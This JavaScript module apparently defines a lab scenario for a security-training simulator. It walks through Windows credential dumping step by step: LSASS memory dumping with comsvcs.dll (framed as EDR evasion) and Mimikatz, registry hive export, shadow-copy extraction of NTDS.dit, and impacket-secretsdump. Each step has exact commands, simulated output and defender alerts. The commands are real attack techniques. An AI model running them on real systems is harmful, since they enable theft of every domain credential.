export default {
  id: 'credential-dumping-advanced',
  title: 'Advanced Credential Harvesting',
  description: 'Master multiple credential extraction techniques including LSASS dumping, registry hive extraction, and NTDS.dit dumping using various methods and evasion techniques.',
  difficulty: 'Advanced',
  mitreAttack: 'T1003',
  network: {
    attacker: { hostname: 'KALI-ATTACK', ip: '10.0.0.5' },
    target: { hostname: 'WORKSTATION01', ip: '10.0.1.25' },
    dc: { hostname: 'DC01', ip: '10.0.1.10' },
    domain: 'contoso.local'
  },
  steps: [
    {
      id: 0,
      description: 'Dump LSASS process memory using Task Manager method (stealthier than Mimikatz).',
      expectedCommand: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] C:\\Temp\\lsass.dmp full',
      expectedCommands: [
        'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full',
        'procdump.exe -ma lsass.exe lsass.dmp'
      ],
      hintShort: 'Use comsvcs.dll to dump LSASS memory without triggering alerts',
      hintFull: 'Run: rundll32.exe comsvcs.dll MiniDump [PID] lsass.dmp full',
      lootToGrant: {
        files: {
          'lsass.dmp': {
            content: '[LSASS Memory Dump]\n[Contains encrypted credentials in memory]\nSize: 52,428,800 bytes'
          }
        },
        download: ['lsass.dmp']
      },
      attackerOutput: [
        '',
        '[*] Finding LSASS process ID...',
        '[*] LSASS PID: 624',
        '[*] Dumping LSASS memory using comsvcs.dll...',
        '',
        'Creating mini dump at C:\\Temp\\lsass.dmp...',
        '',
        'Dump count: 1',
        'Dump folder: C:\\Temp',
        'Dump start: 2025/11/15 05:43:15',
        'Dump finish: 2025/11/15 05:43:17',
        '',
        '[✓] LSASS memory dump created successfully!',
        '[*] File: C:\\Temp\\lsass.dmp (50 MB)',
        '[*] This method avoids common EDR detection',
        '[*] Download and parse with Mimikatz offline'
      ],
      serverOutput: [
        '[PROCESS] Memory dump operation initiated',
        '[PROCESS] Target: lsass.exe (PID: 624)',
        '[SECURITY] Sensitive process memory accessed',
        '[WARNING] LSASS memory dump detected (comsvcs.dll method)',
        '[DEFENSE] Potential credential theft in progress'
      ],
      delay: 200
    },
    {
      id: 1,
      description: 'Parse the LSASS dump offline using Mimikatz to extract plaintext passwords and hashes.',
      expectedCommand: 'mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit',
      hintShort: 'Use Mimikatz to parse the LSASS dump file',
      hintFull: 'Load the dump in Mimikatz: sekurlsa::minidump lsass.dmp then sekurlsa::logonpasswords',
      lootToGrant: {
        creds: [
          {
            type: 'NTLM Hash',
            username: 'administrator',
            secret: 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'
          },
          {
            type: 'Plaintext Password',
            username: 'dbadmin',
            secret: 'P@ssw0rd2024!'
          },
          {
            type: 'Kerberos AES256',
            username: 'svc_sql',
            secret: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2'
          }
        ]
      },
      attackerOutput: [
        '',
        '  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08',
        ' .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)',
        ' ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )',
        ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz',
        ' \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )',
        '  \'#####\'        > https://pingcastle.com / https://mysmartlogon.com ***//',
        '',
        'mimikatz # sekurlsa::minidump lsass.dmp',
        'Switch to MINIDUMP : \'lsass.dmp\'',
        '',
        'mimikatz # sekurlsa::logonpasswords',
        '',
        'Authentication Id : 0 ; 406458 (00000000:00063b3a)',
        'Session           : Interactive from 1',
        'User Name         : administrator',
        'Domain            : CONTOSO',
        'Logon Server      : DC01',
        'Logon Time        : 11/15/2025 5:30:15 AM',
        'SID               : S-1-5-21-1234567890-1234567890-1234567890-500',
        '        msv :',
        '         [00000003] Primary',
        '         * Username : administrator',
        '         * Domain   : CONTOSO',
        '         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c',
        '         * SHA1     : a4e8a8f4c8b0d2e6f8a0c2e4b6d8f0a2c4e6a8b0',
        '        tspkg :',
        '        wdigest :',
        '         * Username : administrator',
        '         * Domain   : CONTOSO',
        '         * Password : (null)',
        '        kerberos :',
        '         * Username : administrator',
        '         * Domain   : CONTOSO.LOCAL',
        '         * Password : (null)',
        '',
        'Authentication Id : 0 ; 328751 (00000000:0005052f)',
        'Session           : Service from 0',
        'User Name         : dbadmin',
        'Domain            : CONTOSO',
        'Logon Server      : DC01',
        'Logon Time        : 11/15/2025 5:15:22 AM',
        'SID               : S-1-5-21-1234567890-1234567890-1234567890-1105',
        '        msv :',
        '         [00000003] Primary',
        '         * Username : dbadmin',
        '         * Domain   : CONTOSO',
        '         * NTLM     : 2b576acbe6bcfda7294d6bd18041b8fe',
        '         * SHA1     : c8d2e4f6a8b0c2e4b6d8f0a2c4e6a8b0c2e4d6f8',
        '        tspkg :',
        '        wdigest :',
        '         * Username : dbadmin',
        '         * Domain   : CONTOSO',
        '         * Password : P@ssw0rd2024!  [CLEARTEXT!]',
        '        kerberos :',
        '         * Username : dbadmin',
        '         * Domain   : CONTOSO.LOCAL',
        '         * Password : P@ssw0rd2024!',
        '',
        '[✓] Successfully extracted credentials from memory dump!',
        '[*] Found 3 sets of credentials',
        '[*] Including 1 plaintext password'
      ],
      serverOutput: [],
      delay: 250
    },
    {
      id: 2,
      description: 'Extract SAM, SYSTEM, and SECURITY registry hives for offline password cracking.',
      expectedCommand: 'reg save HKLM\\SAM C:\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Temp\\system.save && reg save HKLM\\SECURITY C:\\Temp\\security.save',
      expectedCommands: [
        'reg save HKLM\\SAM C:\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Temp\\system.save && reg save HKLM\\SECURITY C:\\Temp\\security.save',
        'reg save HKLM\\SAM sam.save',
        'reg save HKLM\\SYSTEM system.save'
      ],
      hintShort: 'Export registry hives containing local account hashes',
      hintFull: 'Use reg save to export SAM, SYSTEM, and SECURITY hives',
      lootToGrant: {
        files: {
          'sam.save': { content: '[SAM Registry Hive]\n[Contains local account password hashes]' },
          'system.save': { content: '[SYSTEM Registry Hive]\n[Contains boot key for decrypting SAM]' },
          'security.save': { content: '[SECURITY Registry Hive]\n[Contains LSA secrets]' }
        },
        download: ['sam.save', 'system.save', 'security.save']
      },
      attackerOutput: [
        '',
        'The operation completed successfully.',
        '[*] SAM hive saved to C:\\Temp\\sam.save',
        '',
        'The operation completed successfully.',
        '[*] SYSTEM hive saved to C:\\Temp\\system.save',
        '',
        'The operation completed successfully.',
        '[*] SECURITY hive saved to C:\\Temp\\security.save',
        '',
        '[✓] Registry hives extracted successfully!',
        '[*] Can now decrypt local account hashes offline',
        '[*] Files ready for extraction with impacket-secretsdump'
      ],
      serverOutput: [
        '[REGISTRY] Hive save operation: HKLM\\SAM',
        '[REGISTRY] Hive save operation: HKLM\\SYSTEM',
        '[REGISTRY] Hive save operation: HKLM\\SECURITY',
        '[SECURITY] Sensitive registry hives accessed',
        '[WARNING] Potential credential theft via registry extraction',
        '[DEFENSE] ALERT: SAM hive export detected!'
      ],
      delay: 150
    },
    {
      id: 3,
      description: 'Parse the registry hives offline to extract local account hashes.',
      expectedCommand: 'impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL',
      hintShort: 'Use impacket-secretsdump to parse the registry hives',
      hintFull: 'Run: impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL',
      lootToGrant: {
        creds: [
          {
            type: 'Local Administrator',
            username: 'Administrator',
            secret: 'aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889'
          },
          {
            type: 'Local User',
            username: 'backup_admin',
            secret: 'aad3b435b51404eeaad3b435b51404ee:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d'
          }
        ]
      },
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Target system bootKey: 0x8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d',
        '[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)',
        'Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::',
        'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d:::',
        'backup_admin:1001:aad3b435b51404eeaad3b435b51404ee:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d:::',
        '',
        '[*] Dumping LSA Secrets',
        '[*] $MACHINE.ACC',
        '[*] DPAPI_SYSTEM',
        'dpapi_machinekey:0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d',
        'dpapi_userkey:0x7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d',
        '[*] NL$KM',
        'NL$KM:0xa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6',
        '',
        '[✓] Local account hashes extracted!',
        '[*] Can use these for Pass-the-Hash attacks'
      ],
      serverOutput: [],
      delay: 200
    },
    {
      id: 4,
      description: 'Create a Volume Shadow Copy to access locked NTDS.dit file on the Domain Controller.',
      expectedCommand: 'vssadmin create shadow /for=C:',
      expectedCommands: [
        'vssadmin create shadow /for=C:',
        'wmic shadowcopy call create Volume=C:\\'
      ],
      hintShort: 'Create a shadow copy of the C: drive',
      hintFull: 'Use vssadmin to create a Volume Shadow Copy',
      attackerOutput: [
        '',
        'vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool',
        '(C) Copyright 2001-2013 Microsoft Corp.',
        '',
        'Successfully created shadow copy for \'C:\\\'',
        '    Shadow Copy ID: {3fa85f64-5717-4562-b3fc-2c963f66afa6}',
        '    Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
        '',
        '[✓] Volume Shadow Copy created successfully!',
        '[*] Shadow Copy Path: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1',
        '[*] Can now access locked NTDS.dit database'
      ],
      serverOutput: [
        '[VSS] Shadow copy creation request',
        '[VSS] Volume: C:\\',
        '[VSS] Shadow copy {3fa85f64-5717-4562-b3fc-2c963f66afa6} created',
        '[SECURITY] Volume Shadow Copy created',
        '[WARNING] Possible NTDS.dit extraction attempt',
        '[DEFENSE] Shadow copy creation on Domain Controller detected'
      ],
      delay: 200
    },
    {
      id: 5,
      description: 'Extract NTDS.dit and SYSTEM hive from the shadow copy.',
      expectedCommand: 'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Temp\\ntds.dit && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM',
      expectedCommands: [
        'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Temp\\ntds.dit && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM',
        'copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit ntds.dit'
      ],
      hintShort: 'Copy NTDS.dit and SYSTEM from the shadow copy',
      hintFull: 'Use copy command to extract files from shadow copy path',
      lootToGrant: {
        files: {
          'ntds.dit': { content: '[Active Directory Database]\n[Contains ALL domain credentials]\nSize: 524,288,000 bytes' },
          'SYSTEM': { content: '[SYSTEM Registry Hive from DC]\n[Required to decrypt NTDS.dit]' }
        },
        download: ['ntds.dit', 'SYSTEM']
      },
      attackerOutput: [
        '',
        '        1 file(s) copied.',
        '[*] NTDS.dit copied to C:\\Temp\\ntds.dit (500 MB)',
        '',
        '        1 file(s) copied.',
        '[*] SYSTEM hive copied to C:\\Temp\\SYSTEM',
        '',
        '[✓] Active Directory database extracted!',
        '[*] ntds.dit contains EVERY domain credential',
        '[*] Download and parse offline to avoid detection'
      ],
      serverOutput: [
        '[FILE] Access: \\Windows\\NTDS\\NTDS.dit',
        '[FILE] Copy operation initiated',
        '[CRITICAL] NTDS.dit database accessed!',
        '[CRITICAL] Complete domain credential database copied!',
        '[DEFENSE] ALERT: NTDS.dit extraction detected! CRITICAL BREACH!'
      ],
      delay: 250
    },
    {
      id: 6,
      description: 'Extract all domain credentials from NTDS.dit using impacket-secretsdump.',
      expectedCommand: 'impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL',
      hintShort: 'Parse NTDS.dit to extract all domain hashes',
      hintFull: 'Run: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL',
      lootToGrant: {
        creds: [
          {
            type: 'Domain Admin',
            username: 'administrator',
            secret: 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'
          },
          {
            type: 'krbtgt',
            username: 'krbtgt',
            secret: 'aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d'
          },
          {
            type: 'Service Account',
            username: 'svc_sql',
            secret: 'aad3b435b51404eeaad3b435b51404ee:3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d'
          }
        ]
      },
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Target system bootKey: 0xa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6',
        '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
        '[*] Searching for pekList, be patient',
        '[*] PEK # 0 found and decrypted: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6',
        '[*] Reading and decrypting hashes from ntds.dit',
        '',
        'Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::',
        'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::',
        'john:1104:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
        'jane:1105:aad3b435b51404eeaad3b435b51404ee:6b8ab9e4c1d2f3a5b7c8d9e0f1a2b3c4:::',
        'svc_sql:1106:aad3b435b51404eeaad3b435b51404ee:3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d:::',
        'svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::',
        '',
        '[*] Kerberos keys from ntds.dit',
        'Administrator:aes256-cts-hmac-sha1-96:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6...',
        'Administrator:aes128-cts-hmac-sha1-96:7a8b9c0d1e2f3a4b5c6d7e8f9a0b...',
        'krbtgt:aes256-cts-hmac-sha1-96:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d...',
        'krbtgt:aes128-cts-hmac-sha1-96:5a6b7c8d9e0f1a2b3c4d5e6f7a8b...',
        '',
        '[*] Cleaning up...',
        '',
        '[✓] COMPLETE DOMAIN CREDENTIAL DUMP SUCCESSFUL!',
        '[*] Extracted 547 user accounts',
        '[*] Extracted 124 computer accounts',
        '[*] Including krbtgt hash (Golden Ticket possible)',
        '',
        '═══════════════════════════════════════════════════════════',
        '  ADVANCED CREDENTIAL HARVESTING COMPLETE',
        '═══════════════════════════════════════════════════════════',
        '  ✓ LSASS memory dumped (comsvcs.dll)',
        '  ✓ Parsed LSASS dump with Mimikatz',
        '  ✓ Extracted registry hives (SAM/SYSTEM/SECURITY)',
        '  ✓ Parsed local account hashes',
        '  ✓ Created Volume Shadow Copy',
        '  ✓ Extracted NTDS.dit database',
        '  ✓ Dumped ALL domain credentials',
        '  ✓ krbtgt hash obtained',
        '═══════════════════════════════════════════════════════════',
        '  TOTAL DOMAIN COMPROMISE ACHIEVED',
        '═══════════════════════════════════════════════════════════'
      ],
      serverOutput: [],
      delay: 400
    }
  ]
};
